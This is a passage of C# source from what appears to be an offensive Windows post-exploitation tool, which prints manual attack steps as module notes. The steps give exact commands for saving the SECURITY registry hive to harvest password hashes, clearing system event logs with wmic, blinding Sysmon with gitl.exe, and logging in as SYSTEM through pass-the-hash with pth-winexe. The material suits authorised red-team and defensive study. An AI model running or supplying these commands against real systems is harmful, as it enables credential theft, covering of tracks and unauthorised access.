            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, isManualTask: true);

            moduleId = "win_manual_exploit_backup_security_hive_reg";
            title = "Backup the security hive which can contain hashed passwords via reg";
            notes = "Run the following command:\n" + 
                    "    reg save HKLM\\Security security.hive";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, isManualTask: true);

            moduleId = "win_manual_recon_check_missing_patches_info_nessus";
            title = "Check for missing patches via Nessus";
            notes = "Check for missing patches via Nessus credentialed scans";
            refs = "";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, isManualTask: true);

            moduleId = "win_manual_hidingpresence_clear_system_logs_wmic";
            title = "Clear system logs via wmimc";
            notes = @"Clearing all the logs via wmic, run the command:
                wmic nteventlog where filename='system' call cleareventlog
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, isManualTask: true);


            moduleId = "win_manual_hidingpresence_hiding_activity_from_sysmon_gitl";
            title = "Hiding activity from Sysmon via gitl.exe";
            notes = @"Hiding all activity from Sysmon via gitl:
                
                # Download the Ghost in the logs binary to disk - already in /server/Ghost-In-The-Logs/ folder
                
                # Require Admin Privileges
                # Now, load and enable the hook, and disable all logging
                gitl.exe load
                gitl.exe enable
                gitl.exe status 
                
                # Disable the gitl.exe
                gitl.exe disable
            ";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, isManualTask: true);


            moduleId = "win_manual_recon_check_missing_patches_info_metasploit";
            title = "Check for missing patches via Metasploit";
            notes = "Check for missing patches via Metasploit through 'post/windows/gather/enum_patches'";
            refs = "";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, isManualTask: true);

            moduleId = "win_manual_exploit_login_as_system";
            title = "Login as SYSTEM user given Administrative access";
            notes = "# To login as system via pth-winexe via Kali\n" +  
                    "pth-winexe --system -U [domain]/<username>%<hash> //<host> cmd.exe\n" + 
                    "# to run other commands remotely e.g. get a list of users via Kali\n" + 
                    "pth-net rpc user -U \"<username>%<LM:NTLM hash>\" -S <server>";
            refs = "";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes, refs, isManualTask: true);
            
            // Currently, there are issues with running SharpUp and SharpSploit together. See issue 124 on github.com/cobbr/covenant/issues/124
            // These must be run separately.
            /*moduleId = "sharpup";
            title = "Running SharpUp: Privilege Escalation Checks";
            if (shouldExecModule(modulesToExec, moduleId)) {
                TextWriter realStdOut = Console.Out;
                TextWriter realStdErr = Console.Error;
                TextWriter stdOutWriter = new StringWriter();
                TextWriter stdErrWriter = new StringWriter();
                Console.SetOut(stdOutWriter);
                Console.SetError(stdErrWriter);
                Console.WriteLine("[*] Running SharpUp: Running Privilege Escalation Checks");
                Program.PrivescChecks(true);
                Console.Out.Flush();
                Console.Error.Flush();
                Console.SetOut(realStdOut);
                Console.SetError(realStdErr);
                output += stdOutWriter.ToString();
                output += stdErrWriter.ToString();
            }*/
        }
        catch (Exception e) { output += e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        return output;
    }
}
